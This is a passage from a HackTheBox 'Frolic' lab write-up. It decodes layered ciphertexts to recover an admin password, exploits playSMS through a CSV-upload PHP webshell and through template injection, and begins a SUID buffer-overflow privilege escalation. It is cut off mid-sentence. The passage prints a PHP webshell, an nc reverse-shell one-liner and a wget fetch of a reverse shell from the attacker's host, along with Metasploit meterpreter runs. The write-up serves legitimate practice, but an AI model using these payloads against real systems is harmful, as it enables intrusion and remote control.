</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">password</code></ul><li>Extract the archive<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd]
 └─# unzip -P password file
 Archive:  file
   inflating: index.php 
</pre></table></code></div></div><li>File <code class="language-plaintext highlighter-rouge">index.php</code> contains another ciphertext<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd]
 └─# cat index.php
 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">hex</code></ul><li>Convert <code class="language-plaintext highlighter-rouge">hex</code> to <code class="language-plaintext highlighter-rouge">ascii</code> and then <code class="language-plaintext highlighter-rouge">base64</code> decode it<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd]
 └─# cat index.php | xxd -r -p | base64 -d | tee brainfuck.txt
 base64: invalid input
 +++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +.--- --.++ +++++ .&lt;+
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">brainfuck</code></ul><li>Decrypt <code class="language-plaintext highlighter-rouge">brainfuck</code> encoded text <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220920212555.png" alt="" data-proofer-ignore><li>I was stuck for awhile until I realised that <code class="language-plaintext highlighter-rouge">base64</code> did not completely decode everything because it errored out.<li>Use an online base64 decoder <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220920220833.png" alt="" data-proofer-ignore><li>Decrypt <code class="language-plaintext highlighter-rouge">brainfuck</code> encoded text <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220920220932.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">idkwhatispass</code></ul></ol><h2 id="tcp9999-http---playsms-importphp-rce-manual">TCP/9999 (HTTP) - playSMS import.php RCE (Manual) <a href="#tcp9999-http---playsms-importphp-rce-manual" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Successfully login w/ <code class="language-plaintext highlighter-rouge">admin:idkwhatispass</code> at <code class="language-plaintext highlighter-rouge">/playsms</code><li>Unable to find the version of <code class="language-plaintext highlighter-rouge">playSMS</code>, we will have to try the exploits 1 by 1.<li><p>Search exploits for <code class="language-plaintext highlighter-rouge">playSMS</code></p><div class="table-wrapper"><table><thead><tr><th>Exploit Title<th>Path<tbody><tr><td>PlaySMS - ‘import.php’ (Authenticated) CSV File Upload Code Execution (Metasploit)<td>php/remote/44598.rb<tr><td>PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit)<td>php/remote/48335.rb<tr><td>PlaySms 0.7 - SQL Injection<td>linux/remote/404.pl<tr><td>PlaySms 0.9.3 - Multiple Local/Remote File Inclusions<td>php/webapps/7687.txt<tr><td>PlaySms 0.9.5.2 - Remote File Inclusion<td>php/webapps/17792.txt<tr><td>PlaySMS 1.4 - ‘/sendfromfile.php’ Remote Code Execution / Unrestricted File Upload<td>php/webapps/42003.txt<tr><td>PlaySMS 1.4 - ‘import.php’ Remote Code Execution<td>php/webapps/42044.txt<tr><td>PlaySMS 1.4 - ‘sendfromfile.php?Filename’ (Authenticated) ‘Code Execution (Metasploit)<td>php/remote/44599.rb<tr><td>PlaySMS 1.4 - Remote Code Execution<td>php/webapps/42038.txt<tr><td>PlaySMS 1.4.3 - Template Injection / Remote Code Execution<td>php/webapps/48199.txt</table></div><li>Tried <code class="language-plaintext highlighter-rouge">PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload</code> (<code class="language-plaintext highlighter-rouge">php/webapps/42003.txt</code>), but it doesn’t work, I think it is patched. <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921035059.png" alt="" data-proofer-ignore><li>How does <code class="language-plaintext highlighter-rouge">PlaySMS 1.4 - 'import.php' Remote Code Execution</code> (<code class="language-plaintext highlighter-rouge">php/webapps/42044.txt</code>) work?<ul><li>Due to improper file contents handling in <code class="language-plaintext highlighter-rouge">import.php</code>, authenticated users are able to upload a <code class="language-plaintext highlighter-rouge">.csv</code> file containing a webshell, and can execute any code by modifying the <code class="language-plaintext highlighter-rouge">User-Agent</code> field to the code they want to execute.</ul><li>Try <code class="language-plaintext highlighter-rouge">PlaySMS 1.4 - 'import.php' Remote Code Execution</code> (<code class="language-plaintext highlighter-rouge">php/webapps/42044.txt</code>)<ol><li>Create the malicious <code class="language-plaintext highlighter-rouge">.csv</code> file<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> # Payload
 &lt;?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?&gt;
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921005603.png" alt="" data-proofer-ignore></p><li>Proceed to <code class="language-plaintext highlighter-rouge">http://frolic.htb:9999/playsms/index.php?app=main&amp;inc=feature_phonebook&amp;route=import&amp;op=list</code><li>Change <code class="language-plaintext highlighter-rouge">User-Agent</code> w/ <code class="language-plaintext highlighter-rouge">burp</code> or <a href="https://addons.mozilla.org/en-US/firefox/addon/hackbar-free/"><code class="language-plaintext highlighter-rouge">hackbar</code></a><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> # Steps
 Load URL -&gt; Edit User-Agent Field -&gt; Execute
		
 # Payload
 id;whoami
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921012311.png" alt="" data-proofer-ignore></p><li>Upload <code class="language-plaintext highlighter-rouge">exploit.csv</code>, we have RCE <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921012425.png" alt="" data-proofer-ignore><li>Start <code class="language-plaintext highlighter-rouge">netcat</code> listener<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/exploit]
 └─# nc -nvlp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
</pre></table></code></div></div><li>Invoke reverse shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> # Steps
 Load URL -&gt; Edit User-Agent Field -&gt; Execute
		
 # Payload
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 4444 &gt;/tmp/f
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921013242.png" alt="" data-proofer-ignore></p><li><code class="language-plaintext highlighter-rouge">www-data</code> shell obtained<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/exploit]
 └─# nc -nvlp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
 Ncat: Connection from 10.10.10.111.
 Ncat: Connection from 10.10.10.111:38270.
 /bin/sh: 0: can't access tty; job control turned off
 $ id;whoami
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data
 $ cd /home/ayush
 $ wc -c user.txt
 33 user.txt
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921013400.png" alt="" data-proofer-ignore></p></ol><li>Demo - playSMS import.php RCE <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/vmware_9AkoBVF6Sh.gif" alt="" data-proofer-ignore></ol><h2 id="tcp9999-http---playsms-rce-metasploit">TCP/9999 (HTTP) - playSMS RCE (Metasploit) <a href="#tcp9999-http---playsms-rce-metasploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Launch <code class="language-plaintext highlighter-rouge">msfconsole</code><li>Search for <code class="language-plaintext highlighter-rouge">UnrealIRCd</code> and use <code class="language-plaintext highlighter-rouge">exploit/unix/irc/unreal_ircd_3281_backdoor</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> msf6 &gt; use 0
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; 
</pre></table></code></div></div><li>Set <code class="language-plaintext highlighter-rouge">OPTIONS</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre> msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; set PASSWORD idkwhatispass
 PASSWORD =&gt; idkwhatispass
 msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; set RHOSTS frolic.htb
 RHOSTS =&gt; frolic.htb
 msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; set RPORT 9999
 RPORT =&gt; 9999
 msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; set TARGETURI /playsms
 TARGETURI =&gt; /playsms
 msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; set LHOST tun0
 LHOST =&gt; 10.10.14.14
 msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; show options
 msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; set payload payload/php/meterpreter/reverse_tcp
 payload =&gt; php/meterpreter/reverse_tcp
</pre></table></code></div></div><li>View <code class="language-plaintext highlighter-rouge">OPTIONS</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre> msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; show options
	
 Module options (exploit/multi/http/playsms_uploadcsv_exec):
	
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    PASSWORD   idkwhatispass    yes       Password to authenticate with
    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS     frolic.htb       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT      9999             yes       The target port (TCP)
    SSL        false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI  /playsms         yes       Base playsms directory path
    USERNAME   admin            yes       Username to authenticate with
    VHOST                       no        HTTP server virtual host
	
	
 Payload options (php/meterpreter/reverse_tcp):
	
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    LHOST  10.10.14.14      yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
	
	
 Exploit target:
	
    Id  Name
    --  ----
    0   PlaySMS 1.4
</pre></table></code></div></div><li>Exploit!<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; exploit
	
 [*] Started reverse TCP handler on 10.10.14.14:4444 
 [+] Authentication successful: admin:idkwhatispass
 [*] Sending stage (39282 bytes) to 10.10.10.111
 [*] Meterpreter session 7 opened (10.10.14.14:4444 -&gt; 10.10.10.111:38334 ) at 2022-09-21 03:44:10 +0800
 meterpreter &gt; shell
 Process 3445 created.
 Channel 0 created.
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921040300.png" alt="" data-proofer-ignore></p></ol><h1 id="initial-foothold---2-unintended-path">Initial Foothold - 2 (Unintended Path)</h1><h2 id="tcp9999-http---unauthenticated-playsms-template-injection--rce-manual">TCP/9999 (HTTP) - Unauthenticated playSMS Template Injection + RCE (Manual) <a href="#tcp9999-http---unauthenticated-playsms-template-injection--rce-manual" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>This exploit came out much later (2020-02-05), and it works unauthenticated.<li>How does <code class="language-plaintext highlighter-rouge">PlaySMS 1.4.3 - Template Injection / Remote Code Execution</code> (<code class="language-plaintext highlighter-rouge">php/webapps/48199.txt</code>) work?<ol><li>This issue is caused by double processing a server-side template with a custom PHP template system called ‘TPL’ which is used in the PlaySMS template engine at <code class="language-plaintext highlighter-rouge">src/Playsms/Tpl.php:_compile()</code>.<li>The vulnerability is triggered when an attacker supplied username with a malicious payload is submitted.<li>This malicious payload is then stored in a TPL template which when rendered a second time, results in code execution. - <a href="https://www.google.com/search?client=opera-gx&amp;q=metasploit+playsms+serverside+template+injection&amp;sourceid=opera&amp;ie=UTF-8&amp;oe=UTF-8">Source</a></ol><li>Try <code class="language-plaintext highlighter-rouge">PlaySMS 1.4.3 - Template Injection / Remote Code Execution</code> (<code class="language-plaintext highlighter-rouge">php/webapps/48199.txt</code>)<ol><li>Execute the command in between braces and backticks at the username field<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> # Payload
 {{`id;whoami`}}
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921041348.png" alt="" data-proofer-ignore></p><li>Tried to execute a reverse shell, failed<li>Download <code class="language-plaintext highlighter-rouge">php-reverse-shell</code> onto <code class="language-plaintext highlighter-rouge">frolic.htb</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> # Payload
 {{`wget -O /tmp/shell.php 10.10.14.14/php-reverse-shell.php`}}

 ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/exploit]
 └─# python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.10.111 - - [21/Sep/2022 04:36:10] "GET /php-reverse-shell.php HTTP/1.1" 200 -
</pre></table></code></div></div><li>Start <code class="language-plaintext highlighter-rouge">netcat</code> listener<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/exploit]
 └─# nc -nvlp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
</pre></table></code></div></div><li>Invoke reverse shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> # Payload
 {{`php /tmp/shell.php`}}
</pre></table></code></div></div><li><code class="language-plaintext highlighter-rouge">www-data</code> shell obtained</ol><li>Demo - Unauthenticated playSMS Template Injection RCE <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/vmware_gOoEjVmEhr.gif" alt="" data-proofer-ignore></ol><h2 id="tcp9999-http---unauthenticated-playsms-template-injection--rce-metasploit">TCP/9999 (HTTP) - Unauthenticated playSMS Template Injection + RCE (Metasploit) <a href="#tcp9999-http---unauthenticated-playsms-template-injection--rce-metasploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>This exploit came out much later (2020-02-05), and it works unauthenticated.<li>Set <code class="language-plaintext highlighter-rouge">OPTIONS</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> msf6 exploit(multi/http/playsms_template_injection) &gt;  set RHOSTS frolic.htb
 RHOSTS =&gt; frolic.htb
 msf6 exploit(multi/http/playsms_template_injection) &gt;  set RPORT 9999
 RPORT =&gt; 9999
 msf6 exploit(multi/http/playsms_template_injection) &gt;  set TARGETURI /playsms
 TARGETURI =&gt; /playsms
 msf6 exploit(multi/http/playsms_template_injection) &gt;  set payload payload/php/meterpreter/reverse_tcp
 payload =&gt; php/meterpreter/reverse_tcp
 msf6 exploit(multi/http/playsms_template_injection) &gt;  set LHOST tun0
 LHOST =&gt; tun0
 msf6 exploit(multi/http/playsms_template_injection) &gt; 
</pre></table></code></div></div><li>View <code class="language-plaintext highlighter-rouge">OPTIONS</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre> msf6 exploit(multi/http/playsms_template_injection) &gt; show options
	
 Module options (exploit/multi/http/playsms_template_injection):
	
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS     frolic.htb       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT      9999             yes       The target port (TCP)
    SSL        false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI  /playsms         yes       Base playsms directory path
    VHOST                       no        HTTP server virtual host
	
	
 Payload options (php/meterpreter/reverse_tcp):
	
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    LHOST  tun0             yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
	
	
 Exploit target:
	
    Id  Name
    --  ----
    0   PlaySMS Before 1.4.3
</pre></table></code></div></div><li>Exploit!<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre> msf6 exploit(multi/http/playsms_template_injection) &gt; exploit
	
 [*] Started reverse TCP handler on 10.10.14.14:4444 
 [+] Payload successfully sent
 [*] Sending stage (39282 bytes) to 10.10.10.111
 [*] Meterpreter session 10 opened (10.10.14.14:4444 -&gt; 10.10.10.111:38344 ) at 2022-09-21 04:00:25 +0800
	
 meterpreter &gt; shell
 Process 3464 created.
 Channel 0 created.
 id;whoami
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921040140.png" alt="" data-proofer-ignore></p></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="root---enumeration">Root - Enumeration <a href="#root---enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Search for files w/ SUID bit set<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre> www-data@frolic:/$ find / -perm /4000 -type f -exec ls -lda {} \; 2&gt;/dev/null
 -rwsr-xr-x 1 root root 38660 Mar  6  2017 /sbin/mount.cifs
 -rwsr-xr-x 1 root root 34812 Dec  1  2017 /bin/mount
 -rwsr-xr-x 1 root root 43316 May  8  2014 /bin/ping6
 -rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
 -rwsr-xr-x 1 root root 38932 May  8  2014 /bin/ping
 -rwsr-xr-x 1 root root 26492 Dec  1  2017 /bin/umount
 -rwsr-xr-x 1 root root 38900 May 17  2017 /bin/su
 -rwsr-xr-x 1 root root 157424 Jan 28  2017 /bin/ntfs-3g
 -rwsr-xr-x 1 root root 7480 Sep 25  2018 /home/ayush/.binary/rop
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">/home/ayush/.binary/rop</code></ul><li>Determine the file type of <code class="language-plaintext highlighter-rouge">rop</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> www-data@frolic:/$ file /home/ayush/.binary/rop
 /home/ayush/.binary/rop: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped
</pre></table></code></div></div><li>Execute <code class="language-plaintext highlighter-rouge">rop</code> to see what it does<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> www-data@frolic:/$ /home/ayush/.binary/rop testing123
 [+] Message sent: testing123www-data@frolic:/$ 
</pre></table></code></div></div><ul><li>Most likely a buffer overflow exploit</ul></ol><h2 id="root---bof">Root - BOF <a href="#root---bof" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Identify security properties built into <code class="language-plaintext highlighter-rouge">rop</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot]
 └─# checksec rop
 [*] '/root/htb/frolic/10.10.10.111/loot/rop'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
	    
 www-data@frolic:/home/ayush/.binary$ cat /proc/sys/kernel/randomize_va_space
 0
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">NX</code> - Enabled<li><code class="language-plaintext highlighter-rouge">ASLR</code> - Disabled<li>This BOF is basically <a href="https://yufongg.github.io/posts/Node/#privilege-escalation---7-bof">HackTheBox - Node (Read my writeup :D)</a> but ASLR is disabled, so its easier as there is no need to bruteforce the memory.</ul><li>Return to libc attack <strong>bruteforce</strong><ul><li>An attacker overflows a buffer on the process stack with NOP sleds and a <strong>payload</strong> to overwrite the return address (at the end of a function) in such a way that the pointed-to address is somewhere in the NOP sled. The CPU will then slide to the payload and execute it. - <a href="https://nikhilh20.medium.com/return-to-libc-exploit-aa3fe6fb0d69">Source</a><li>Overwrite the return address to an address that points to <code class="language-plaintext highlighter-rouge">system("/bin/bash")</code></ul><li>Use <code class="language-plaintext highlighter-rouge">binaryninja</code> to examine <code class="language-plaintext highlighter-rouge">rop</code> to determine the vulnerable function<li>After importing the <code class="language-plaintext highlighter-rouge">rop</code>, select <code class="language-plaintext highlighter-rouge">main</code> function <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220921021032.png" alt="" data-proofer-ignore><blockquote class="prompt-info"><div><ol><li>Basically, the program is accepting an argument, if an argument is given,<ol><li>JMP to the box containing <code class="language-plaintext highlighter-rouge">vuln</code> function, which will print out the argument<li>If no argument is given, prints the usage</ol><li>Inside the <code class="language-plaintext highlighter-rouge">vuln</code> function contains a vulnerability due to the usage of <code class="language-plaintext highlighter-rouge">strcpy</code><ul><li><code class="language-plaintext highlighter-rouge">0x38</code> is freed from the stack, <code class="language-plaintext highlighter-rouge">0x8</code> is freed from the stack<li>64 bytes is freed from the stack<li>If we give an argument greater than 64bytes it will cause a buffer 